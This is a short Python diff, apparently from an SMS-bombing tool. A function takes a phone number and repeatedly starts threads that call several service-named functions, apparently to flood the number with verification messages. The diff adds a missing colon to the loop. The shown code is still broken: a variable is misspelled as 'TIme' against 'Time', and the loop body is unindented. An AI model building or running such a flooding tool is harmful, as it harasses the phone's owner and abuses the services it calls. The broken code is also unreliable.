@@ -829,7 +829,7 @@ def is_phone(phone: str):
 def Vip(p):
     phone=is_phone(p)
     TIme=0.00001
-    for i in range(0,20)
+    for i in range(0,20):
     Thread(target=bama, args=[phone]).start(), sleep(Time)
     Thread(target=rubika, args=[phone]).start(), sleep(Time)
     Thread(target=snap, args=[phone]).start(), sleep(Time)
